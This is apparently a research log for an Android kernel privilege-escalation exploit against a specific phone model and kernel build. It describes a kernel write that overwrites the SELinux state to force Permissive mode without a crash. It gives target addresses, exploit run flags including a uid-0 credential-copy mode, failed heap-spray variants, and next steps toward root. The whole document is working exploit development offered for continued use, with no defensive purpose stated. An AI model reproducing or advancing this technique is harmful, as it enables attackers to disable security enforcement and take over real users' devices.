# Z15 — SELinux Permissive park that *stays* up (2026-08-23)

**Branch:** `research-master`  
**Device:** CPH2521 / `5.10.236-android12-9-o-g74d132f4467a`  
**Log:** `logs/aarif_pull/Z15_plain_console.txt`  
**Boot:** `4a50ba6c-de20-4ec1-976b-92f74f186f1d`

## Result

```
PLAIN-STORE *selinux_state = P0(0x02BB0000)
pselect ret=5  success=1  enf_wrote=1  enforce_after=0
boot_id unchanged
getenforce → Permissive
id → uid=2000 context=u:r:shell:s0     ← NOT context=?
zygote + system_server alive at T+790s (Z14 died at T+100s)
uid still 2000
```

This supersedes **Z4** as the product park. Z4 used an 8-byte NULL into `&selinux_state` and was a delayed freeze (Z14 logged it).

## Geometry

1. **No heap spray.** Overlay does not use skb reclaim (Z9–Z13 died at `pselect pre-select` on missed spray pages).
2. **Stack:** `task = P0(init_task)` `ffffff802a7cc000`, `lock = P0(init_task+0x878)` `ffffff802a7cc878` (empty `pi_waiters`, NULL `pi_top`).
3. **W1 store — PLAIN-STORE only-left, not leaf NULL:**
   - `0x02A793C8` is `&selinux_state` (packed bools: disabled, enforcing, checkreqprot, initialized).
   - `tree_pc = P0(0x02BB0000)` (red), `tree_l = state`, `tree_r = 0`.
   - LE bytes keep **enforcing=0** and **initialized≠0**.
   - `change_child` extra store lands in BSS scratch at `value+8`.

## Fire

WiFi or USB. Unix LF runner (not `fire_mode.ps1` CRLF). Binary ≥ 190928 for cred_copy fill.

```
MODE4_ONLY=1 MODE4_SLIDE_ZERO=1 DATAONLY_TARGET=0x2a793c8
MODE4_SWAP_NOCFI=1 MODE4_UID0=1
```

Wanted: `SLIDE_ZERO PLAIN-STORE` and `id` still `u:r:…` after a few minutes.

## What failed (do not repeat)

| Tag | Why |
|-----|-----|
| Z4 leaf NULL | 8-byte `*state=0` zeros `initialized` → SID flood → ColorOS kills `system_server` ~100s later (Z14 dump) |
| Z9–Z13 spray overlay | `lock=task=sprayed page`, reclaim miss, KP at `pselect pre-select` |
| Z5 | second GhostLock process on a park boot → requeue KP |
| Z15 cred | post-park spray ran but `g_cred_copy` stayed 0 (`pselect_custom_write` cleared). Fixed: `MODE4_UID0` always fills copy. |

## Next

Fresh boot. Same fire. After park: same-process spray **only** for `cred_copy` VALUE; overlay lock/task stay BSS. Child P0 leak already works (`ffffff80…`). Do not second-process a live park.
